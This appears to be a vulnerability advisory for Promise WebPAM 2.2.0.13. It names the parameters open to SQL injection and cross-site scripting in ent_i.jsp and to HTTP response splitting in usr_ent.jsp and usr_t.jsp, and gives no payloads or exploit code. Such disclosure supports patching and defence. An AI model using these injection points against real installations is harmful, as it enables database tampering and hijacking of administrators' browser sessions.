Promise WebPAM v2.2.0.13 Multiple Remote Vulnerabilities


Vendor: Promise Technology, Inc.
Product web page: http://www.promise.com
Affected version: 2.2.0.13

Summary: WebPAM is a web based Promise Array Management Software
that's easy-to use, designed to simplify RAID storage management.
WebPAM is specifically designed for Promise HBA. WebPAM can configure,
manage or monitor Promise RAID products remotely from a web browser
from anywhere in the world.

Desc: Input passed via the parameters 'entSortOrder' and 'entSort' in
'ent_i.jsp' script are not properly sanitised before being returned to
the user or used in SQL queries. This can be exploited to manipulate SQL
queries by injecting arbitrary SQL code. The parameters 'startTime' and
'endTime' in 'ent_i.jsp' are vulnerable to a XSS issue where the attacker
can execute arbitrary HTML and script code in a user's browser session in
context of an affected site. The parameter 'userID' in 'usr_ent.jsp' and
'usr_t.jsp' is vulnerable to HTTP Response Splitting which can be exploited
to insert arbitrary HTTP headers, which are included in a response sent to
the user.

Tested on: Microsoft Windows XP Professional SP3 (EN)
           Jetty/4.2.23 (Windows XP/5.1 x86 java/1.4.2)
